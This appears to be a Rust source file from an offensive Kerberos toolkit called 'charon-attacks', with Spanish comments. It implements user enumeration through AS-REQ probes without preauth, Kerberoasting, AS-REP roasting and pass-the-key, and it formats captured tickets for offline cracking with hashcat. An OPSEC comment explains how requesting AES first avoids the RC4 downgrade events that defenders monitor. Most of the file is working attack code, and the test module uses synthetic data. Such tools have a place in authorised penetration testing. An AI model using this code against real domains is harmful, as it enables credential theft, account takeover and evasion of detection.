//! # charon-attacks — primitivos ofensivos como manipulación de protocolo
//!
//! Cada primitivo es una forma de usar el protocolo contra sí mismo y se
//! apoya por completo en el stack (M1). Nada aquí habla "criptografía":
//! solo construcción de mensajes, lectura de errores del KDC y formateo
//! de material para hashcat (el cracking NO es responsabilidad de Charon).
//!
//! | Primitivo | Manipulación |
//! |---|---|
//! | Enum de usuarios | AS-REQ sin preauth → leer 25/6/24 del KDC |
//! | Kerberoasting | TGS-REQ por SPN → crackear offline el ticket; AES-first para no generar downgrade |
//! | AS-REP roast | cuentas DONT_REQUIRE_PREAUTH → el enc-part llega cifrado con la clave del usuario |
//! | Pass-the-key | la clave (NT hash o AES) sustituye a la contraseña en el preauth |

use charon_client::{AsProbe, ClientError, KdcConnection, Tgt};
use charon_kcrypto::{etype, KerberosKey};

#[derive(thiserror::Error, Debug)]
pub enum AttackError {
    #[error(transparent)]
    Client(#[from] ClientError),
}

pub type Result<T> = std::result::Result<T, AttackError>;

// ---------- enumeración de usuarios ----------

/// Estado de una cuenta según lo que el KDC filtra sin preauth.
#[derive(Clone, Debug, PartialEq)]
pub enum UserStatus {
    /// Existe, requiere preauth, y el KDC regaló el salt en PA-ETYPE-INFO2.
    ExistsWithPreauth { salts: Vec<(i32, String)> },
    /// Existe y NO requiere preauth: candidata a AS-REP roast.
    ExistsWithoutPreauth,
    /// No existe.
    Unknown,
    /// Existe pero el preauth enviado falló (solo se ve enviando preauth).
    PreauthFailed,
    /// Otro código (fingerprint del KDC: apúntalo en la matriz).
    Other(i32),
}

impl UserStatus {
    pub fn exists(&self) -> bool {
        !matches!(self, UserStatus::Unknown)
    }
}

/// Enumera un usuario con un AS-REQ sin preauth.
pub fn enum_user(conn: &KdcConnection, user: &str, realm: &str, etypes: &[i32]) -> Result<UserStatus> {
    Ok(match charon_client::probe_as_no_preauth(conn, user, realm, etypes)? {
        AsProbe::PreauthRequired { salts, .. } => UserStatus::ExistsWithPreauth {
            salts: salts
                .into_iter()
                .filter_map(|s| s.salt.map(|b| (s.etype, String::from_utf8_lossy(&b).into_owned())))
                .collect(),
        },
        AsProbe::NoPreauth { .. } => UserStatus::ExistsWithoutPreauth,
        AsProbe::PrincipalUnknown { .. } => UserStatus::Unknown,
        AsProbe::PreauthFailed { .. } => UserStatus::PreauthFailed,
        AsProbe::Error { code, .. } => UserStatus::Other(code),
    })
}

/// Enumera una lista (el orden de la lista se conserva).
pub fn enum_users(conn: &KdcConnection, users: &[String], realm: &str, etypes: &[i32]) -> Vec<(String, Result<UserStatus>)> {
    users
        .iter()
        .map(|u| (u.clone(), enum_user(conn, u, realm, etypes)))
        .collect()
}

// ---------- kerberoasting (AES-first) ----------

/// Ticket de servicio empacado para hashcat.
#[derive(Clone, Debug)]
pub struct RoastedTicket {
    pub spn: String,
    pub account: String,
    pub realm: String,
    /// etype real del ticket devuelto por el KDC.
    pub etype: i32,
    /// Línea lista para `hashcat -m 13100` (23) o `-m 19600/19700` (17/18).
    pub hashcat: String,
}

/// Pide un ticket de servicio y lo formatea para crackear offline.
///
/// OPSEC AES-first: `etypes` debería empezar por 18/17. Las tools clásicas
/// piden RC4 siempre; contra cuentas AES eso produce un evento 4769 con
/// encryption type 0x17 (downgrade) que los defensores monitorizan.
/// Charon pide AES y solo cae a RC4 si la cuenta no lo tiene — el ticket
/// sale en el etype más fuerte que la cuenta soporta.
pub fn kerberoast(
    conn: &KdcConnection,
    tgt: &Tgt,
    spn: &str,
    etypes: &[i32],
    kdc_options: u32,
) -> Result<RoastedTicket> {
    let st = charon_client::request_service_ticket(conn, tgt, spn, etypes, kdc_options)?;
    Ok(RoastedTicket {
        spn: spn.to_string(),
        account: tgt.cname.clone(),
        realm: tgt.crealm.clone(),
        etype: st.ticket.enc_part.etype,
        hashcat: formats::tgs_to_hashcat(&st.ticket.enc_part.cipher, st.ticket.enc_part.etype, &tgt.cname, &tgt.crealm, spn),
    })
}

// ---------- AS-REP roasting ----------

/// AS-REP de una cuenta sin preauth, formateado para hashcat.
#[derive(Clone, Debug)]
pub struct RoastedAsRep {
    pub account: String,
    pub realm: String,
    pub etype: i32,
    pub hashcat: String,
}

/// Sondea una cuenta sin preauth y, si el KDC devuelve AS-REP directo,
/// formatea el enc-part para crackear offline.
pub fn asreproast(conn: &KdcConnection, user: &str, realm: &str, etypes: &[i32]) -> Result<Option<RoastedAsRep>> {
    match charon_client::probe_as_no_preauth(conn, user, realm, etypes)? {
        AsProbe::NoPreauth { reply, .. } => {
            let edata = reply.enc_part.cipher.clone();
            let etype_id = reply.enc_part.etype;
            Ok(Some(RoastedAsRep {
                account: user.to_string(),
                realm: realm.to_string(),
                etype: etype_id,
                hashcat: formats::asrep_to_hashcat(&edata, etype_id, user, realm),
            }))
        }
        _ => Ok(None),
    }
}

// ---------- pass-the-key ----------

/// Autentica usando la clave directamente (NT hash o clave AES) sin
/// conocer la contraseña. Con `from_raw` + `request_tgt` es todo el
/// primitivo; esta función es azúcar documentada para el flujo completo.
pub fn pass_the_key(conn: &KdcConnection, user: &str, realm: &str, key: KerberosKey, etypes: &[i32]) -> Result<Tgt> {
    Ok(charon_client::request_tgt(conn, user, realm, &key, etypes, 0)?)
}

// ---------- formatos hashcat ----------

pub mod formats {
    use super::*;

    fn hex(b: &[u8]) -> String {
        b.iter().map(|x| format!("{x:02x}")).collect()
    }

    /// TGS-REP → hashcat.
    /// - etype 23 (modo 13100): `$krb5tgs$23$*user$realm$spn*$<16B>$<resto>`
    ///   (el edata RC4 empieza por el checksum de 16 bytes).
    /// - etype 17/18 (modos 19600/19700): `$krb5tgs$<et>$user$realm$<12B>$<resto>`
    ///   (el edata AES TERMINA con el HMAC-SHA1 truncado de 12 bytes).
    pub fn tgs_to_hashcat(edata: &[u8], etype_id: i32, user: &str, realm: &str, spn: &str) -> String {
        match etype_id {
            etype::RC4_HMAC => {
                if edata.len() < 16 {
                    return String::new();
                }
                format!(
                    "$krb5tgs$23$*{user}${realm}${spn}*${}${}",
                    hex(&edata[..16]),
                    hex(&edata[16..])
                )
            }
            etype::AES128_CTS_HMAC_SHA1_96 | etype::AES256_CTS_HMAC_SHA1_96 => {
                if edata.len() < 12 {
                    return String::new();
                }
                let split = edata.len() - 12;
                format!(
                    "$krb5tgs${etype_id}${user}${realm}${}${}",
                    hex(&edata[split..]),
                    hex(&edata[..split])
                )
            }
            _ => String::new(),
        }
    }

    /// AS-REP → hashcat.
    /// - etype 23 (modo 18200): `$krb5asrep$23$user@realm:<16B>$<resto>`.
    /// - etype 17/18 (modos 19800/19900): `$krb5pa$<et>$user$realm$<edata>`.
    pub fn asrep_to_hashcat(edata: &[u8], etype_id: i32, user: &str, realm: &str) -> String {
        match etype_id {
            etype::RC4_HMAC => {
                if edata.len() < 16 {
                    return String::new();
                }
                format!(
                    "$krb5asrep$23${user}@{realm}:${}${}",
                    hex(&edata[..16]),
                    hex(&edata[16..])
                )
            }
            etype::AES128_CTS_HMAC_SHA1_96 | etype::AES256_CTS_HMAC_SHA1_96 => {
                format!("$krb5pa${etype_id}${user}${realm}${}", hex(edata))
            }
            _ => String::new(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::formats::*;

    #[test]
    fn tgs_hashcat_formats_match_hashcat_wiki() {
        // edata sintético de 64 bytes con patrón reconocible.
        let edata: Vec<u8> = (0..64u8).collect();
        // etype 23 → modo 13100: checksum = primeros 16 bytes, delimitado
        // por *user$realm$spn*$...$ como en la wiki de hashcat.
        let h23 = tgs_to_hashcat(&edata, 23, "user", "REALM.COM", "test/spn");
        assert!(h23.starts_with("$krb5tgs$23$*user$REALM.COM$test/spn*$"));
        assert!(h23.contains("$000102030405060708090a0b0c0d0e0f$"), "checksum RC4 = primeros 16 bytes");
        // etype 18 → modo 19700: checksum = ÚLTIMOS 12 bytes (HMAC truncado),
        // sin asteriscos, separado por $.
        let h18 = tgs_to_hashcat(&edata, 18, "user", "REALM.COM", "test/spn");
        assert!(h18.starts_with("$krb5tgs$18$user$REALM.COM$"));
        let parts: Vec<&str> = h18.split('$').collect();
        // $krb5tgs $18 user realm <cksum> <rest> → índices 0..5 con "" inicial
        assert_eq!(parts[5].len(), 24, "HMAC-SHA1 truncado son 12 bytes hex");
        assert_eq!(parts[6].len(), (64 - 12) * 2);
        // etype 17 análogo.
        let h17 = tgs_to_hashcat(&edata, 17, "u", "r", "s");
        assert!(h17.starts_with("$krb5tgs$17$u$r$"));
    }

    #[test]
    fn asrep_hashcat_formats() {
        let edata: Vec<u8> = (0..48u8).collect();
        let h23 = asrep_to_hashcat(&edata, 23, "jdoe", "LAB.LOCAL");
        assert!(h23.starts_with("$krb5asrep$23$jdoe@LAB.LOCAL:"));
        assert!(h23.contains("$000102030405060708090a0b0c0d0e0f$"));
        let h18 = asrep_to_hashcat(&edata, 18, "jdoe", "LAB.LOCAL");
        assert!(h18.starts_with("$krb5pa$18$jdoe$LAB.LOCAL$"));
    }
}
